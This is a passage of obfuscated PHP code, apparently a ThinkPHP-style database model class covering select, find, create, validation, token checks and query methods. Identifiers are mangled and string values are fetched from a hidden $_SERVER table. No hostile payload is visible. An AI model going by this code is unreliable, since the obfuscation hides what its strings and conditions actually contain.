isset($¢©ã·”™[$ÍæŒô–[354]][$·İ˜´Ö])) { $àÅœÍã“ = $¢©ã·”™[$ÍæŒô–[354]][$·İ˜´Ö]; } $Ó­­‡İ = $this->db->delete($¢©ã·”™); if (!1 !== $Ó­­‡İ) { $äÒÉ¯¨ó = array(); if (isset($àÅœÍã“)) { $äÒÉ¯¨ó[$·İ˜´Ö] = $àÅœÍã“; } $this->_after_delete($äÒÉ¯¨ó, $¢©ã·”™); } return $Ó­­‡İ; } protected function _after_delete($”âªŸ¯æ, $ıÊŠ¢ À) { } public function select($”æÈÊ = array()) { $Âë¸ò™ =& $_SERVER[¶Ô„œ…¯]; if (is_string($”æÈÊ) || is_numeric($”æÈÊ)) { $‹àãáíÉ = $this->getPk(); if (strpos($”æÈÊ, $Âë¸ò™[50])) { $¸õÔÓòÒ[$‹àãáíÉ] = array($Âë¸ò™[355], $”æÈÊ); } else { $¸õÔÓòÒ[$‹àãáíÉ] = $”æÈÊ; } $this->options[$Âë¸ò™[354]] = $¸õÔÓòÒ; } elseif (!1 === $”æÈÊ) { $”æÈÊ = $this->_parseOptions(); return $Âë¸ò™[356] . $this->db->buildSelectSql($”æÈÊ) . $Âë¸ò™[357]; } $”æÈÊ = $this->_parseOptions(); $û‹®³ş· = $this->db->select($”æÈÊ); if (!1 === $û‹®³ş·) { return !1; } if (empty($û‹®³ş·)) { return null; } $this->_afterSelect($û‹®³ş·, $”æÈÊ); return $û‹®³ş·; } protected function _afterSelect(&$üİ‡’Ôï, $ìõ¿ş²©) { } public function buildSql($ÁâÓıã = array()) { $ÛÏ£óú© =& $_SERVER[¶Ô„œ…¯]; $ÁâÓıã = $this->_parseOptions($ÁâÓıã); return $ÛÏ£óú©[356] . $this->db->buildSelectSql($ÁâÓıã) . $ÛÏ£óú©[357]; } public function optionsValue($¶Ôî¤â¯ = null) { if (is_null($¶Ôî¤â¯)) { return $this->options; } elseif (is_array($¶Ôî¤â¯)) { $this->options = array_merge($this->options, $¶Ôî¤â¯); } } protected function _parseOptions($¤µ ° = array()) { $­©¸ëÉÀ =& $_SERVER[¶Ô„œ…¯]; if (is_array($¤µ °)) { $¤µ ° = array_merge($this->options, $¤µ °); } $this->options = array(); if (!isset($¤µ °[$­©¸ëÉÀ[358]])) { $¤µ °[$­©¸ëÉÀ[358]] = $this->getTableName(); $¸”ñ” Ù = $this->fields; } else { $¸”ñ” Ù = $this->getDbFields(); } if (!empty($¤µ °[$­©¸ëÉÀ[359]])) { $¤µ °[$­©¸ëÉÀ[358]] .= $­©¸ëÉÀ[53] . $¤µ °[$­©¸ëÉÀ[359]]; } $¤µ °[$­©¸ëÉÀ[360]] = $this->name; if (isset($¤µ °[$­©¸ëÉÀ[354]]) && is_array($¤µ °[$­©¸ëÉÀ[354]]) && !empty($¸”ñ” Ù) && !isset($¤µ °[$­©¸ëÉÀ[361]]) && !isset($¤µ °[$­©¸ëÉÀ[358]])) { foreach ($¤µ °[$­©¸ëÉÀ[354]] as $Ú¨áˆ³â => $¬¡¶—Òô) { $Ú¨áˆ³â = trim($Ú¨áˆ³â); if (in_array($Ú¨áˆ³â, $¸”ñ” Ù, !0)) { if (is_scalar($¬¡¶—Òô)) { $this->_parseType($¤µ °[$­©¸ëÉÀ[354]], $Ú¨áˆ³â); } } elseif (!is_numeric($Ú¨áˆ³â) && $­©¸ëÉÀ[11] != substr($Ú¨áˆ³â, 0, 1) && !1 === strpos($Ú¨áˆ³â, $­©¸ëÉÀ[10]) && !1 === strpos($Ú¨áˆ³â, $­©¸ëÉÀ[339]) && !1 === strpos($Ú¨áˆ³â, $­©¸ëÉÀ[214]) && !1 === strpos($Ú¨áˆ³â, $­©¸ëÉÀ[286])) { unset($¤µ °[$­©¸ëÉÀ[354]][$Ú¨áˆ³â]); } } } $this->_options_filter($¤µ °); return $¤µ °; } protected function _options_filter(&$ªşììÎ) { } protected function _parseType(&$…¯Ë¡¸¦, $„Îƒã§×) { $óŒ¥Ô¶û =& $_SERVER[¶Ô„œ…¯]; if (empty($this->options[$óŒ¥Ô¶û[362]][$óŒ¥Ô¶û[4] . $„Îƒã§×])) { $Ñ…Ç„µù = strtolower($this->fields[$óŒ¥Ô¶û[331]][$„Îƒã§×]); if (!1 !== strpos($Ñ…Ç„µù, $óŒ¥Ô¶û[363])) { } elseif (!1 === strpos($Ñ…Ç„µù, $óŒ¥Ô¶û[364]) && !1 !== strpos($Ñ…Ç„µù, $óŒ¥Ô¶û[365])) { $…¯Ë¡¸¦[$„Îƒã§×] = intval($…¯Ë¡¸¦[$„Îƒã§×]); } elseif (!1 !== strpos($Ñ…Ç„µù, $óŒ¥Ô¶û[366]) || !1 !== strpos($Ñ…Ç„µù, $óŒ¥Ô¶û[367])) { $…¯Ë¡¸¦[$„Îƒã§×] = floatval($…¯Ë¡¸¦[$„Îƒã§×]); } elseif (!1 !== strpos($Ñ…Ç„µù, $óŒ¥Ô¶û[368])) { $…¯Ë¡¸¦[$„Îƒã§×] = (bool) $…¯Ë¡¸¦[$„Îƒã§×]; } } } public function find($é½ğµı– = array()) { $­ÔØ°©² =& $_SERVER[¶Ô„œ…¯]; if (is_numeric($é½ğµı–) || is_string($é½ğµı–)) { $Ñ‹¼¸ß[$this->getPk()] = intval($é½ğµı–); $this->options[$­ÔØ°©²[354]] = $Ñ‹¼¸ß; } $this->options[$­ÔØ°©²[369]] = 1; $é½ğµı– = $this->_parseOptions(); $Ÿ™§õÑä = $this->db->select($é½ğµı–); if (!1 === $Ÿ™§õÑä) { return !1; } if (empty($Ÿ™§õÑä)) { return null; } $this->data = $Ÿ™§õÑä[0]; $this->_afterFind($this->data, $é½ğµı–); if (!empty($this->options[$­ÔØ°©²[370]])) { return $this->returnResult($this->data, $this->options[$­ÔØ°©²[370]]); } return $this->data; } protected function _afterFind(&$Ê  Ï´ü, $´ìøÓó) { } protected function returnResult($Ê´ÇÛ¶Ÿ, $ŠàİÙÍî = '') { $ê·„¯«ë =& $_SERVER[¶Ô„œ…¯]; if ($ŠàİÙÍî) { if (is_callable($ŠàİÙÍî)) { return call_user_func($ŠàİÙÍî, $Ê´ÇÛ¶Ÿ); } switch (strtolower($ŠàİÙÍî)) { case $ê·„¯«ë[371]: return json_encode($Ê´ÇÛ¶Ÿ); case $ê·„¯«ë[372]: return xml_encode($Ê´ÇÛ¶Ÿ); } } return $Ê´ÇÛ¶Ÿ; } public function parseFieldsMap($ñÍà³¹â, $ˆ¦‡’Ê© = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ê»×´í« => $’Ö½ÖÍ±) { if ($ˆ¦‡’Ê© == 1) { if (isset($ñÍà³¹â[$’Ö½ÖÍ±])) { $ñÍà³¹â[$Ê»×´í«] = $ñÍà³¹â[$’Ö½ÖÍ±]; unset($ñÍà³¹â[$’Ö½ÖÍ±]); } } else { if (isset($ñÍà³¹â[$Ê»×´í«])) { $ñÍà³¹â[$’Ö½ÖÍ±] = $ñÍà³¹â[$Ê»×´í«]; unset($ñÍà³¹â[$Ê»×´í«]); } } } } return $ñÍà³¹â; } public function setField($âÛº»µÃ, $òÄœ“„ß = '') { if (is_array($âÛº»µÃ)) { $â™ÜÕâ = $âÛº»µÃ; } else { $â™ÜÕâ[$âÛº»µÃ] = $òÄœ“„ß; } return $this->save($â™ÜÕâ); } public function setAdd($é‚¼Œ³Š, $¸Ã­š ¡ = 1) { $¥œÖ”Õò =& $_SERVER[¶Ô„œ…¯]; $×êŸøïó = $é‚¼Œ³Š . $¥œÖ”Õò[373] . $¸Ã­š ¡; if ($¸Ã­š ¡ < 0) { $×êŸøïó = $é‚¼Œ³Š . $¸Ã­š ¡; } return $this->setField($é‚¼Œ³Š, array($¥œÖ”Õò[374], $×êŸøïó)); } public function getField($À‚•²±, $¨ÓÂô = null) { $“Ô±´ =& $_SERVER[¶Ô„œ…¯]; $¦Û§Ï¤›[$“Ô±´[352]] = $À‚•²±; $¦Û§Ï¤› = $this->_parseOptions($¦Û§Ï¤›); $À‚•²± = trim($À‚•²±); if (strpos($À‚•²±, $“Ô±´[50])) { if (!isset($¦Û§Ï¤›[$“Ô±´[369]])) { $¦Û§Ï¤›[$“Ô±´[369]] = is_numeric($¨ÓÂô) ? $¨ÓÂô : $“Ô±´[12]; } $ÖØÂË³ = $this->db->select($¦Û§Ï¤›); if (!empty($ÖØÂË³)) { $˜¥Ÿ—Û = explode($“Ô±´[50], $À‚•²±); $À‚•²± = array_keys($ÖØÂË³[0]); $¸€—Òóƒ = array_shift($À‚•²±); $±¬Ù˜¼Í = array_shift($À‚•²±); $–ªÓÓ = array(); $Âû™†° = count($˜¥Ÿ—Û); foreach ($ÖØÂË³ as $Ü‘”Òß) { $…àÌÕ¥ = $Ü‘”Òß[$¸€—Òóƒ]; if (2 == $Âû™†°) { $–ªÓÓ[$…àÌÕ¥] = $Ü‘”Òß[$±¬Ù˜¼Í]; } else { $–ªÓÓ[$…àÌÕ¥] = is_string($¨ÓÂô) ? implode($¨ÓÂô, $Ü‘”Òß) : $Ü‘”Òß; } } return $–ªÓÓ; } } else { if (!0 !== $¨ÓÂô) { $¦Û§Ï¤›[$“Ô±´[369]] = is_numeric($¨ÓÂô) ? $¨ÓÂô : 1; } if ($¨ÓÂô === $“Ô±´[334]) { unset($¦Û§Ï¤›[$“Ô±´[369]]); } $Ü‘”Òß = $this->db->select($¦Û§Ï¤›); if (!empty($Ü‘”Òß)) { if ($¨ÓÂô === $“Ô±´[334]) { return reset($Ü‘”Òß[0]); } if (!0 !== $¨ÓÂô && 1 == $¦Û§Ï¤›[$“Ô±´[369]]) { return reset($Ü‘”Òß[0]); } foreach ($Ü‘”Òß as $·³á´‹´) { $Ãœ÷Ê€[] = $·³á´‹´[$À‚•²±]; } return $Ãœ÷Ê€; } } return null; } public function create($ãÊæì¾È = '', $Öó„‹Ò = '') { $—òØ¬ˆ =& $_SERVER[¶Ô„œ…¯]; if (empty($ãÊæì¾È)) { $ãÊæì¾È = $_POST; } elseif (is_object($ãÊæì¾È)) { $ãÊæì¾È = get_object_vars($ãÊæì¾È); } if (empty($ãÊæì¾È) || !is_array($ãÊæì¾È)) { $this->error = think_lang($—òØ¬ˆ[350]); return !1; } $ãÊæì¾È = $this->parseFieldsMap($ãÊæì¾È, 0); $Öó„‹Ò = $Öó„‹Ò ? $Öó„‹Ò : (!empty($ãÊæì¾È[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$—òØ¬ˆ[352]])) { $Ñ§Ÿ‹î = $this->options[$—òØ¬ˆ[352]]; unset($this->options[$—òØ¬ˆ[352]]); } elseif ($Öó„‹Ò == THINK_MODEL_INSERT && isset($this->insertFields)) { $Ñ§Ÿ‹î = $this->insertFields; } elseif ($Öó„‹Ò == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Ñ§Ÿ‹î = $this->updateFields; } if (isset($Ñ§Ÿ‹î)) { if (is_string($Ñ§Ÿ‹î)) { $Ñ§Ÿ‹î = explode($—òØ¬ˆ[50], $Ñ§Ÿ‹î); } if (think_config($—òØ¬ˆ[375])) { $Ñ§Ÿ‹î[] = think_config($—òØ¬ˆ[376]); } foreach ($ãÊæì¾È as $¬Ñ»®Ó¸ => $üÎŸÕû´) { if (!in_array($¬Ñ»®Ó¸, $Ñ§Ÿ‹î)) { unset($ãÊæì¾È[$¬Ñ»®Ó¸]); } } } if (!$this->autoValidation($ãÊæì¾È, $Öó„‹Ò)) { return !1; } if (!$this->autoCheckToken($ãÊæì¾È)) { $this->error = think_lang($—òØ¬ˆ[377]); return !1; } if ($this->autoCheckFields) { $Ñ§Ÿ‹î = $this->getDbFields(); foreach ($ãÊæì¾È as $¬Ñ»®Ó¸ => $üÎŸÕû´) { if (!in_array($¬Ñ»®Ó¸, $Ñ§Ÿ‹î)) { unset($ãÊæì¾È[$¬Ñ»®Ó¸]); } elseif (MAGIC_QUOTES_GPC && is_string($üÎŸÕû´)) { $ãÊæì¾È[$¬Ñ»®Ó¸] = stripslashes($üÎŸÕû´); } } } $this->autoOperation($ãÊæì¾È, $Öó„‹Ò); $this->data = $ãÊæì¾È; return $ãÊæì¾È; } public function autoCheckToken($‚×ÎşşĞ) { $›é¦´÷Â =& $_SERVER[¶Ô„œ…¯]; if (isset($this->options[$›é¦´÷Â[378]]) && !$this->options[$›é¦´÷Â[378]]) { return !0; } if (think_config($›é¦´÷Â[375])) { $‘ŠÅ„µá = think_config($›é¦´÷Â[376]); if (!isset($‚×ÎşşĞ[$‘ŠÅ„µá]) || Session::get($‘ŠÅ„µá)) { return !1; } list($ØÖàĞ•—, $œ¸õñÉ) = explode($›é¦´÷Â[11], $‚×ÎşşĞ[$‘ŠÅ„µá]); if ($œ¸õñÉ && Session::get($‘ŠÅ„µá . $›é¦´÷Â[10] . $ØÖàĞ•—) === $œ¸õñÉ) { Session::remove($‘ŠÅ„µá . $›é¦´÷Â[10] . $ØÖàĞ•—); return !0; } if (think_config($›é¦´÷Â[379])) { Session::remove($‘ŠÅ„µá . $›é¦´÷Â[10] . $ØÖàĞ•—); } return !1; } return !0; } public function regex($€ˆ‰åÄ¯, $øúËŒÃ) { $§Ñ¬±âã =& $_SERVER[¶Ô„œ…¯]; $Æ§ãşŞ† = array($§Ñ¬±âã[380] => $§Ñ¬±âã[381], $§Ñ¬±âã[382] => $§Ñ¬±âã[383], $§Ñ¬±âã[384] => $§Ñ¬±âã[385], $§Ñ¬±âã[386] => $§Ñ¬±âã[387], $§Ñ¬±âã[388] => $§Ñ¬±âã[389], $§Ñ¬±âã[390] => $§Ñ¬±âã[391], $§Ñ¬±âã[392] => $§Ñ¬±âã[393], $§Ñ¬±âã[367] => $§Ñ¬±âã[394], $§Ñ¬±âã[395] => $§Ñ¬±âã[396]); if (isset($Æ§ãşŞ†[strtolower($øúËŒÃ)])) { $øúËŒÃ = $Æ§ãşŞ†[strtolower($øúËŒÃ)]; } return preg_match($øúËŒÃ, $€ˆ‰åÄ¯) === 1; } private function autoOperation(&$’Ÿ¶Ñâ¥, $§ì«½¬´) { $ÉÍåø =& $_SERVER[¶Ô„œ…¯]; if (!empty($this->options[$ÉÍåø[397]])) { $Îó´“°ã = $this->options[$ÉÍåø[397]]; unset($this->options[$ÉÍåø[397]]); } elseif (!empty($this->_auto)) { $Îó´“°ã = $this->_auto; } if (isset($Îó´“°ã)) { foreach ($Îó´“°ã as $ÄÀ­Ñè…) { if (empty($ÄÀ­Ñè…[2])) { $ÄÀ­Ñè…[2] = THINK_MODEL_INSERT; } if ($§ì«½¬´ == $ÄÀ­Ñè…[2] || $ÄÀ­Ñè…[2] == THINK_MODEL_BOTH) { switch (trim($ÄÀ­Ñè…[3])) { case $ÉÍåø[398]: case $ÉÍåø[399]: $”ÕÓè‡Ï = isset($ÄÀ­Ñè…[4]) ? (array) $ÄÀ­Ñè…[4] : array(); if (isset($’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]])) { array_unshift($”ÕÓè‡Ï, $’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]]); } if ($ÉÍåø[398] == $ÄÀ­Ñè…[3]) { $’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]] = call_user_func_array($ÄÀ­Ñè…[1], $”ÕÓè‡Ï); } else { $’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]] = call_user_func_array(array(&$this, $ÄÀ­Ñè…[1]), $”ÕÓè‡Ï); } break; case $ÉÍåø[352]: $’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]] = $’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[1]]; break; case $ÉÍåø[400]: if ($ÉÍåø[12] === $’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]]) { unset($’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]]); } break; case $ÉÍåø[401]: default: $’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]] = $ÄÀ­Ñè…[1]; } if (!1 === $’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]]) { unset($’Ÿ¶Ñâ¥[$ÄÀ­Ñè…[0]]); } } } } return $’Ÿ¶Ñâ¥; } protected function autoValidation($ÖæÁ‰¿á, $½Ö¼€‹¨) { $¸Óï§ =& $_SERVER[¶Ô„œ…¯]; if (!empty($this->options[$¸Óï§[402]])) { $¸ä‚®ö = $this->options[$¸Óï§[402]]; unset($this->options[$¸Óï§[402]]); } elseif (!empty($this->_validate)) { $¸ä‚®ö = $this->_validate; } if (isset($¸ä‚®ö)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¸ä‚®ö as $ Ô±‹ğü => $ºÆÆğò) { if (empty($ºÆÆğò[5]) || $ºÆÆğò[5] == THINK_MODEL_BOTH || $ºÆÆğò[5] == $½Ö¼€‹¨) { if (0 == strpos($ºÆÆğò[2], $¸Óï§[403]) && strpos($ºÆÆğò[2], $¸Óï§[404])) { $ºÆÆğò[2] = think_lang(substr($ºÆÆğò[2], 2, -1)); } $ºÆÆğò[3] = isset($ºÆÆğò[3]) ? $ºÆÆğò[3] : THINK_EXISTS_VALIDATE; $ºÆÆğò[4] = isset($ºÆÆğò[4]) ? $ºÆÆğò[4] : $¸Óï§[405]; switch ($ºÆÆğò[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ÖæÁ‰¿á, $ºÆÆğò)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($¸Óï§[12] != trim($ÖæÁ‰¿á[$ºÆÆğò[0]])) { if (!1 === $this->_validationField($ÖæÁ‰¿á, $ºÆÆğò)) { return !1; } } break; default: if (isset($ÖæÁ‰¿á[$ºÆÆğò[0]])) { if (!1 === $this->_validationField($ÖæÁ‰¿á, $ºÆÆğò)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ÁÇşƒÆı, $Êô¨Ö†ç) { if (!1 === $this->_validationFieldItem($ÁÇşƒÆı, $Êô¨Ö†ç)) { if ($this->patchValidate) { $this->error[$Êô¨Ö†ç[0]] = $Êô¨Ö†ç[2]; } else { $this->error = $Êô¨Ö†ç[2]; return !1; } } return; } protected function _validationFieldItem($é—ƒŒÌ, $ªƒ¾€Ïô) { $±ƒŒ÷À =& $_SERVER[¶Ô„œ…¯]; switch (strtolower(trim($ªƒ¾€Ïô[4]))) { case $±ƒŒ÷À[398]: case $±ƒŒ÷À[399]: $åÚäãÅé = isset($ªƒ¾€Ïô[6]) ? (array) $ªƒ¾€Ïô[6] : array(); if (is_string($ªƒ¾€Ïô[0]) && strpos($ªƒ¾€Ïô[0], $±ƒŒ÷À[50])) { $ªƒ¾€Ïô[0] = explode($±ƒŒ÷À[50], $ªƒ¾€Ïô[0]); } if (is_array($ªƒ¾€Ïô[0])) { foreach ($ªƒ¾€Ïô[0] as $ù•æâº‘) { $ñùÃ¯à˜[$ù•æâº‘] = $é—ƒŒÌ[$ù•æâº‘]; } array_unshift($åÚäãÅé, $ñùÃ¯à˜); } else { array_unshift($åÚäãÅé, $é—ƒŒÌ[$ªƒ¾€Ïô[0]]); } if ($±ƒŒ÷À[398] == $ªƒ¾€Ïô[4]) { return call_user_func_array($ªƒ¾€Ïô[1], $åÚäãÅé); } else { return call_user_func_array(array(&$this, $ªƒ¾€Ïô[1]), $åÚäãÅé); } case $±ƒŒ÷À[406]: return $é—ƒŒÌ[$ªƒ¾€Ïô[0]] == $é—ƒŒÌ[$ªƒ¾€Ïô[1]]; case $±ƒŒ÷À[407]: if (is_string($ªƒ¾€Ïô[0]) && strpos($ªƒ¾€Ïô[0], $±ƒŒ÷À[50])) { $ªƒ¾€Ïô[0] = explode($±ƒŒ÷À[50], $ªƒ¾€Ïô[0]); } $ì²±®˜± = array(); if (is_array($ªƒ¾€Ïô[0])) { foreach ($ªƒ¾€Ïô[0] as $ù•æâº‘) { $ì²±®˜±[$ù•æâº‘] = $é—ƒŒÌ[$ù•æâº‘]; } } else { $ì²±®˜±[$ªƒ¾€Ïô[0]] = $é—ƒŒÌ[$ªƒ¾€Ïô[0]]; } if (!empty($é—ƒŒÌ[$this->getPk()])) { $ì²±®˜±[$this->getPk()] = array($±ƒŒ÷À[408], $é—ƒŒÌ[$this->getPk()]); } if ($this->where($ì²±®˜±)->find()) { return !1; } return !0; default: return $this->check($é—ƒŒÌ[$ªƒ¾€Ïô[0]], $ªƒ¾€Ïô[1], $ªƒ¾€Ïô[4]); } } public function check($Õ·ÏŒŒ˜, $©Úå›õë, $ü‹ú·Î = "\162\x65\x67\145\170") { $£¬î¡×Ş =& $_SERVER[¶Ô„œ…¯]; $ü‹ú·Î = strtolower(trim($ü‹ú·Î)); switch ($ü‹ú·Î) { case $£¬î¡×Ş[7]: case $£¬î¡×Ş[409]: $¢·ÄÀ‰” = is_array($©Úå›õë) ? $©Úå›õë : explode($£¬î¡×Ş[50], $©Úå›õë); return $ü‹ú·Î == $£¬î¡×Ş[7] ? in_array($Õ·ÏŒŒ˜, $¢·ÄÀ‰”) : !in_array($Õ·ÏŒŒ˜, $¢·ÄÀ‰”); case $£¬î¡×Ş[410]: case $£¬î¡×Ş[411]: if (is_array($©Úå›õë)) { $ç¯äçö = $©Úå›õë[0]; $ì‹ı„£ = $©Úå›õë[1]; } else { list($ç¯äçö, $ì‹ı„£) = explode($£¬î¡×Ş[50], $©Úå›õë); } return $ü‹ú·Î == $£¬î¡×Ş[410] ? $Õ·ÏŒŒ˜ >= $ç¯äçö && $Õ·ÏŒŒ˜ <= $ì‹ı„£ : $Õ·ÏŒŒ˜ < $ç¯äçö || $Õ·ÏŒŒ˜ > $ì‹ı„£; case $£¬î¡×Ş[412]: case $£¬î¡×Ş[413]: return $ü‹ú·Î == $£¬î¡×Ş[412] ? $Õ·ÏŒŒ˜ == $©Úå›õë : $Õ·ÏŒŒ˜ != $©Úå›õë; case $£¬î¡×Ş[414]: $Àé–¼ã˜ = mb_strlen($Õ·ÏŒŒ˜, $£¬î¡×Ş[415]); if (strpos($©Úå›õë, $£¬î¡×Ş[50])) { list($ç¯äçö, $ì‹ı„£) = explode($£¬î¡×Ş[50], $©Úå›õë); return $Àé–¼ã˜ >= $ç¯äçö && $Àé–¼ã˜ <= $ì‹ı„£; } else { return $Àé–¼ã˜ == $©Úå›õë; } case $£¬î¡×Ş[416]: list($‘ºç·Ã÷, $ã°™´Ûì) = explode($£¬î¡×Ş[50], $©Úå›õë); if (!is_numeric($‘ºç·Ã÷)) { $‘ºç·Ã÷ = strtotime($‘ºç·Ã÷); } if (!is_numeric($ã°™´Ûì)) { $ã°™´Ûì = strtotime($ã°™´Ûì); } return NOW_TIME >= $‘ºç·Ã÷ && NOW_TIME <= $ã°™´Ûì; case $£¬î¡×Ş[417]: return in_array(get_client_ip(), explode($£¬î¡×Ş[50], $©Úå›õë)); case $£¬î¡×Ş[418]: return !in_array(get_client_ip(), explode($£¬î¡×Ş[50], $©Úå›õë)); case $£¬î¡×Ş[405]: default: return $this->regex($Õ·ÏŒŒ˜, $©Úå›õë); } } public function query($í±ÈŠ¿€, $¸¬ùş”ò = false) { $ªŞÂ²½  =& $_SERVER[¶Ô„œ…¯]; if (!is_bool($¸¬ùş”ò) && !is_array($¸¬ùş”ò)) { $¸¬ùş”ò = func_get_args(); array_shift($¸¬ùş”ò); } $í±ÈŠ¿€ = str_replace(array($ªŞÂ²½ [287], $ªŞÂ²½ [419]), $ªŞÂ²½ [53], $í±ÈŠ¿€); $í±ÈŠ¿€ = $this->parseSql($í±ÈŠ¿€, $¸¬ùş”ò); return $this->db->query($í±ÈŠ¿€); } public function execute($Óš“‡©, $ÊÎ†ø‚õ = false) { if (!is_bool($ÊÎ†ø‚õ) && !is_array($ÊÎ†ø‚õ)) { $ÊÎ†ø‚õ = func_get_args(); array_shift($ÊÎ†ø‚õ); } $Óš“‡© = $this->parseSql($Óš“‡©, $ÊÎ†ø‚õ); return $this->db->execute($Óš“‡©); } protected function parseSql($şí«üáî, $ØûğÊÃ‘) { $¹ğÉ†ÊÏ =& $_SERVER[¶Ô„œ…¯]; if (!0 === $ØûğÊÃ‘) { $€–§¼§ô = $this->_parseOptions(); $şí«üáî = $this->db->parseSql($şí«üáî, $€–§¼§ô); } elseif (is_array($ØûğÊÃ‘)) { $ØûğÊÃ‘ = array_map(array($this->db, $¹ğÉ†ÊÏ[420]), $ØûğÊÃ‘); $şí«üáî = vsprintf($şí«üáî, $ØûğÊÃ‘); } else { $şí«üáî = strtr($şí«üáî, array($¹ğÉ†ÊÏ[421] => $this->getTableName(), $¹ğÉ†ÊÏ[422] => think_config($¹ğÉ†ÊÏ[323]))); } $this->db->setModel($this->name); return $şí«üáî; } public function db($Ì¢ğœ = '', $Ê¹İ¼®ˆ = '', $İ§ƒ…‹ó = array()) { $¾¡Úà =& $_SERVER[¶Ô„œ…¯]; if ($¾¡Úà[12] === $Ì¢ğœ && $this->db) { return $this->db; } static $à÷ÄĞôÊ = array(); static $×ü´î© = array(); if (!isset($×ü´î©[$Ì¢ğœ]) || isset($×ü´î©[$Ì¢ğœ]) && $Ê¹İ¼®ˆ && $à÷ÄĞôÊ[$Ì¢ğœ] != $Ê¹İ¼®ˆ) { if (!empty($Ê¹İ¼®ˆ) && is_string($Ê¹İ¼®ˆ) && !1 === strpos($Ê¹İ¼®ˆ, $¾¡Úà[8])) { $Ê¹İ¼®ˆ = think_config($Ê¹İ¼®ˆ); } $Ì¢ğœ = think_guid($Ê¹İ¼®ˆ); $×ü´î©[$Ì¢ğœ] = Db::getInstance($Ê¹İ¼®ˆ); } elseif (NULL === $Ê¹İ¼®ˆ) { $×ü´î©[$Ì¢ğœ]->close(); unset($×ü´î©[$Ì¢ğœ]); return; } if (!empty($İ§ƒ…‹ó)) { if (is_string($İ§ƒ…‹ó)) { parse_str($İ§ƒ…‹ó, $İ§ƒ…‹ó); } foreach ($İ§ƒ…‹ó as $€½ˆà¶± => $ôäÉç») { $this->setProperty($€½ˆà¶±, $ôäÉç»); } } $à÷ÄĞôÊ[$Ì¢ğœ] = $Ê¹İ¼®ˆ; $this->db = $×ü´î©[$Ì¢ğœ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $…ÒÈñÅ = get_class($this); if ($…ÒÈñÅ == $_SERVER[¶Ô„œ…¯][423]) { return $this->name; } $this->name = substr($…ÒÈñÅ, 0, -5); } return $this->name; } public function getTableName() { $ÒˆŠî“¯ =& $_SERVER[¶Ô„œ…¯]; if (empty($this->trueTableName)) { $â§éÉüî = !empty($this->tablePrefix) ? $this->tablePrefix : $ÒˆŠî“¯[12]; if (!empty($this->tableName)) { $â§éÉüî .= $this->tableName; } else { $â§éÉüî .= think_parse_name($this->name); } $this->trueTableName = strtolower($â§éÉüî); } return (!empty($this->dbName) ? $this->dbName . $ÒˆŠî“¯[10] : $ÒˆŠî“¯[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ë—²Ò =& $_SERVER[¶Ô„œ…¯]; return isset($this->fields[$ë—²Ò[330]]) ? $this->fields[$ë—²Ò[330]] : $this->pk; } public function getDbFields() { $×”ÃŸ =& $_SERVER[¶Ô„œ…¯]; if (isset($this->options[$×”ÃŸ[358]])) { $”êœĞ‹ = $this->db->getFields($this->options[$×”ÃŸ[358]]); return $”êœĞ‹ ? array_keys($”êœĞ‹) : !1; } if ($this->fields) { $”êœĞ‹ = $this->fields; unset($”êœĞ‹[$×”ÃŸ[329]], $”êœĞ‹[$×”ÃŸ[330]], $”êœĞ‹[$×”ÃŸ[331]], $”êœĞ‹[$×”ÃŸ[328]]); return $”êœĞ‹; } return !1; } public function data($âÅÎŠ¾Š = '') { $‡ŠæºË‚ =& $_SERVER[¶Ô„œ…¯]; if ($‡ŠæºË‚[12] === $âÅÎŠ¾Š && !empty($this->data)) { return $this->data; } if (is_object($âÅÎŠ¾Š)) { $âÅÎŠ¾Š = get_object_vars($âÅÎŠ¾Š); } elseif (is_string($âÅÎŠ¾Š)) { parse_str($âÅÎŠ¾Š, $âÅÎŠ¾Š); } elseif (!is_array($âÅÎŠ¾Š)) { think_exception(think_lang($‡ŠæºË‚[350])); } $this->data = $âÅÎŠ¾Š; return $this; } public function join($°ã±»íÁ) { $àñ‹˜Ïâ =& $_SERVER[¶Ô„œ…¯]; if (is_array($°ã±»íÁ)) { $this->options[$àñ‹˜Ïâ[361]] = $°ã±»íÁ; } elseif (!empty($°ã±»íÁ)) { $this->options[$àñ‹˜Ïâ[361]][] = $°ã±»íÁ; } return $this; } public function union($¿Š—¯¾ì, $‘ñ¤ã‹“ = false) { $áÊ­ˆ =& $_SERVER[¶Ô„œ…¯]; if (empty($¿Š—¯¾ì)) { return $this; } if ($‘ñ¤ã‹“) { $this->options[$áÊ­ˆ[424]][$áÊ­ˆ[425]] = !0; } if (is_object($¿Š—¯¾ì)) { $¿Š—¯¾ì = get_object_vars($¿Š—¯¾ì); } if (is_string($¿Š—¯¾ì)) { $öå¬ç±œ = $¿Š—¯¾ì; } elseif (is_array($¿Š—¯¾ì)) { if (isset($¿Š—¯¾ì[0])) { $this->options[$áÊ­ˆ[424]] = array_merge($this->options[$áÊ­ˆ[424]], $¿Š—¯¾ì); return $this; } else { $öå¬ç±œ = $¿Š—¯¾ì; } } else { think_exception(think_lang($áÊ­ˆ[350])); } $this->options[$áÊ­ˆ[424]][] = $öå¬ç±œ; return $this; } public function cache($ÆËì¿÷² = true, 